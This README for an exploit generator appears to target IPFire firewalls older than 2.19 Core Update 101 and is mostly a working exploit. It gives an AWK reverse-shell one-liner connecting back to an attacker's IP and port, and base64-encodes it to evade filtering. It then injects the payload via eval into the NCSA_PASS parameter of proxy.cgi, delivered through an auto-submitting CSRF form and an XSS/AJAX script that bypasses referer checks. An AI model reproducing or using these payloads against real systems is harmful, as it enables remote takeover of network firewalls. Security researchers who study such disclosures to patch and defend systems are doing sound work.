# ipfire_payload
Generate and encoded payload for IPFire reverse-shell

You need to change ip and port in gen_payload.py

Proof of Concept 4 :
======================================================================

Finally, with these three previous PoC, it's possible to combine all the mechanisms to gain a full reverse-shell on IPFire.
IPFire does not have netcat nor telnet, socat, python, ruby, php etc ...
The only way to make a reverse-shell is to use Perl or AWK technics. In this PoC, it's the AWK technic that is used :
(From ASafety Reverse-shell cheat-sheet : http://www.asafety.fr/vuln-exploit-poc/pentesting-etablir-un-reverse-shell-en-une-ligne/)

 * The reverse-shell one-line with AWK is :

awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

 * To bypass IPFire filter, you need to encode this command in base64 (after modify <IP> and <PORT>) :

YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsgfX0nIC9kZXYvbnVsbA==

 * Place a \n at each bloc of 64 chars in the base64 version :

YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==

 * This payload can be echo'ed and decoded with openssl, on the fly, into IPFire :

echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d

 * To execute this payload, add backticks and eval call :

eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`

 * Your payload is ready to be used into POST param in proxy.cgi, like the previous PoC :

||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`;#

 * Full PoC (IPFire < 2.19 Core Update 101) 
 (if the referer is defined to IPFire URL, and a netcat is listening # nc -l -vv -p 1337) :

<html>
  <body>
    <form name='x' action='https://<IPFire_IP>:444/cgi-bin/proxy.cgi' method='post'>
      <input type='hidden' name='NCSA_PASS' value='||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjAuMi8xMzM3Ijsg\nd2hpbGUoNDIpIHsgZG97IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxp\nbmUgYzsgaWYoYyl7IHdoaWxlICgoYyB8JiBnZXRsaW5lKSA+IDApIHByaW50ICQw\nIHwmIHM7IGNsb3NlKGMpOyB9IH0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMp\nOyB9fScgL2Rldi9udWxs" | openssl enc -a -d`;#' />
      <input type='hidden' name='NCSA_PASS_CONFIRM' value='||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjAuMi8xMzM3Ijsg\nd2hpbGUoNDIpIHsgZG97IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxp\nbmUgYzsgaWYoYyl7IHdoaWxlICgoYyB8JiBnZXRsaW5lKSA+IDApIHByaW50ICQw\nIHwmIHM7IGNsb3NlKGMpOyB9IH0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMp\nOyB9fScgL2Rldi9udWxs" | openssl enc -a -d`;#' />
	  <input type='hidden' name='NCSA_USERNAME' value='yanncam' />
      <input type='hidden' name='ACTION' value='Ajouter' />
    </form>
    <script>document.forms['x'].submit();</script>
  </body>
</html>

Note that none <IP>/<Port> are defined in the previous payload, you need to reproduce these different steps.

 * With the XSS method to bypass CSRF Referer checking, the third party JS script can be :

var headx=document.getElementsByTagName('head')[0];
var jq= document.createElement('script');
jq.type= 'text/javascript';
jq.src= 'http://code.jquery.com/jquery-latest.min.js';
headx.appendChild(jq);
function loadX(){ // AJAX CSRF bypass referer checking !
    $.ajax({
      type: 'POST',
      url: "https://<IPFire_IP>:444/cgi-bin/proxy.cgi",
      contentType: 'application/x-www-form-urlencoded;charset=utf-8',
      dataType: 'text',
      data: 'NCSA_USERNAME=yanncam&ACTION=Ajouter&NCSA_PASS=||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjEuMzIvMTMzNyI7\nIHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRs\naW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAk\nMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShz\nKTsgfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`;#&NCSA_PASS_CONFIRM=||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjEuMzIvMTMzNyI7\nIHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRs\naW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAk\nMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShz\nKTsgfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`;#'
    });
  }
setTimeout("loadX()",2000);





Source : https://www.exploit-db.com/exploits/39765


